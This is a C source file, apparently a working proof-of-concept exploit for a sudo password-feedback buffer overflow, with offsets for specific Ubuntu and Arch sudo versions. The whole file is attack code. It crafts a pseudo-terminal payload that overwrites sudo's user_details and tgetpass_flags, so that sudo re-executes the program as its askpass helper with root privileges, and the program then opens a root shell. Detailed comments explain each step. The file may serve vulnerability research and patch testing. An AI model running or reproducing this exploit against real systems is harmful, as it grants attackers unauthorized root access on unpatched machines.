#define _GNU_SOURCE
#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>

#define TGP_ASKPASS 0x4
#define SUDO_CONV_REPL_MAX 255

/* sudo 1.8.30-1 */
#define TGP_OFFSET_ARCHLINUX 548
/* sudo 1.8.21p2-3ubuntu1 (bionic 18.04) */
/* sudo 1.8.29-1ubuntu1 (focal 20.04) */
#define TGP_OFFSET_UBUNTU 624

#define KILL_OFFSET (SUDO_CONV_REPL_MAX - 1)
#define OVERFLOW_SIZE 1000
#define TGP_OFFSET TGP_OFFSET_UBUNTU

int main(int argc, char **argv) {
  (void)argv;

  /*
   * When Sudo executes us as the askpass program, argv[1] will be the prompt,
   * usually "[sudo] password for $USER: ". For simplicity, assume that any
   * command-line arguments mean we've been re-executed by Sudo.
   */
  if (argc > 1) {
    if (unsetenv("SUDO_ASKPASS") != 0) {
      warn("unsetenv(SUDO_ASKPASS)");
    }
    /*
     * We replaced stdin with our pseudo-terminal and Sudo replaced stdout with
     * a pipe, so we need to restore these to their original values. For
     * simplicity, assume that stderr still refers to our original terminal.
     */
    if (dup2(STDERR_FILENO, STDIN_FILENO) != STDIN_FILENO) {
      warn("dup2(STDERR_FILENO, STDIN_FILENO)");
    }
    if (dup2(STDERR_FILENO, STDOUT_FILENO) != STDOUT_FILENO) {
      warn("dup2(STDERR_FILENO, STDOUT_FILENO)");
    }
    execlp("sh", "sh", NULL);
    err(1, "execlp(sh)");
  }

  /*
   * Unless stdin is a terminal, Sudo will use sudo_term_kill = 0.
   *
   * In 1.8.25p1, this would still allow us to exploit the buffer overflow, but
   * we would be forced to overwrite the signo[NSIG] array with non-zero bytes.
   * This will unavoidably kill the target process as tgetpass will iterate
   * signo[NSIG] and re-send the signals whose entries are non-zero.
   *
   * In 1.8.26, sudo_term_eof = 0 is used which would prevent us from even
   * reaching the buffer overflow.
   *
   * To resolve this, we allocate a pseudo-terminal (pty) for stdin.
   */
  int ptyfd = posix_openpt(O_NOCTTY | O_RDWR);
  if (ptyfd < 0) {
    err(1, "posix_openpt");
  }
  if (grantpt(ptyfd) != 0) {
    err(1, "grantpt");
  }
  if (unlockpt(ptyfd) != 0) {
    err(1, "unlockpt");
  }

  struct termios term;
  if (tcgetattr(ptyfd, &term) != 0) {
    err(1, "tcgetattr");
  }

  /*
   * We are using a pseudo-terminal but we do not want the driver to preprocess
   * our payload as if we were entering it into an interactive terminal.
   */
  cfmakeraw(&term);
  /*
   * Sudo 1.8.26 and above handles the EOF character. This is, by default,
   * Ctrl-D or 0x04 which is inconveniently the same as TGP_ASKPASS. We could
   * avoid writing 0x04 by adding a benign flag to tgetpass_flags, but it is
   * simpler to change VEOF to an unused character.
   */
  term.c_cc[VEOF] = 0xAA;

  if (tcsetattr(ptyfd, TCSANOW, &term) != 0) {
    err(1, "tcsetattr");
  }

  /*
   * Ensure that neither of the characters used in our payload are special
   * characters that Sudo will treat differently.
   */
  uint8_t sudo_term_eof = term.c_cc[VEOF];
  if (sudo_term_eof == 0 || sudo_term_eof == TGP_ASKPASS) {
    errx(1, "sudo_term_eof = %u", sudo_term_eof);
  }
  uint8_t sudo_term_erase = term.c_cc[VERASE];
  if (sudo_term_erase == 0 || sudo_term_erase == TGP_ASKPASS) {
    errx(1, "sudo_term_erase = %u", sudo_term_erase);
  }
  uint8_t sudo_term_kill = term.c_cc[VKILL];
  if (sudo_term_kill == 0 || sudo_term_kill == TGP_ASKPASS) {
    errx(1, "sudo_term_kill = %u", sudo_term_kill);
  }

  const char *devpts = ptsname(ptyfd);
  if (devpts == NULL) {
    err(1, "ptsname");
  }

  /*
   * To exploit the buffer overflow, the write(fd, "\b \b", 3) syscall must
   * fail, so it is necessary to open our pseudo-terminal with O_RDONLY.
   */
  int ttyfd = open(devpts, O_NOCTTY | O_RDONLY);
  if (ttyfd < 0) {
    err(1, "open(devpts)");
  }

  /*
   * There are two steps to our exploit:
   *
   *  - We want to overwrite user_details.uid = 0 so Sudo does not drop
   * privileges before executing the askpass program.
   *
   *  - We want to overwrite tgetpass_flags with TGP_ASKPASS, so Sudo
   * re-executes us as the askpass program.
   *
   * Conveniently, the buffer we are overflowing is in the BSS segment, so all
   * we need to do is write TGP_ASKPASS into the least significant byte of
   * tgetpass_flags, and zero out the user_details struct.
   */
  uint8_t payload[OVERFLOW_SIZE + 5] = {0};
  /*
   * We need to write sudo_term_kill every KILL_OFFSET (or less) to reset the
   * remaining length and trigger the buffer overflow.
   */
  payload[KILL_OFFSET * 1] = sudo_term_kill;
  payload[KILL_OFFSET * 2] = sudo_term_kill;
  /*
   * Use TGP_OFFSET + 2 because the 2 occurences of sudo_term_kill are not
   * included in the buffer overflow.
   */
  static_assert(TGP_OFFSET + 2 > KILL_OFFSET * 2, "TGP_OFFSET invalid");
  static_assert(TGP_OFFSET + 2 < KILL_OFFSET * 3, "TGP_OFFSET invalid");
  payload[TGP_OFFSET + 2] = TGP_ASKPASS;
  payload[KILL_OFFSET * 3] = sudo_term_kill;
  payload[sizeof(payload) - 2] = sudo_term_kill;
  payload[sizeof(payload) - 1] = '\n';

  if (write(ptyfd, payload, sizeof(payload)) != sizeof(payload)) {
    err(1, "write(ptyfd, payload)");
  }

  /* Replace stdin with our pseudo-terminal so Sudo uses it. */
  if (dup2(ttyfd, STDIN_FILENO) != STDIN_FILENO) {
    err(1, "dup2(ttyfd, STDIN_FILENO)");
  }
  if (close(ttyfd) != 0) {
    warn("close(ttyfd)");
  }

  /*
   * On Linux, /proc/self/exe is a symbolic link to the absolute path of our
   * executable. This is more robust than argv[0], which we would still need to
   * expand into an absolute path.
   */
  char askpass[PATH_MAX + 1];
  ssize_t len = readlink("/proc/self/exe", askpass, sizeof(askpass) - 1);
  if (len < 0) {
    err(1, "readlink(/proc/self/exe)");
  }
  askpass[len] = '\0';

  /*
   * We set SUDO_ASKPASS, but do not provide -A to Sudo because we need to use
   * the buffer overflow to zero out the user_details struct before it executes
   * the askpass program.
   */
  if (setenv("SUDO_ASKPASS", askpass, true) != 0) {
    err(1, "setenv(SUDO_ASKPASS)");
  }

  /*
   * Without -S, Sudo will use /dev/tty instead of our pseudo-terminal on stdin.
   */
  execlp("sudo", "sudo", "-S", "", NULL);
  err(1, "execlp(sudo)");
}
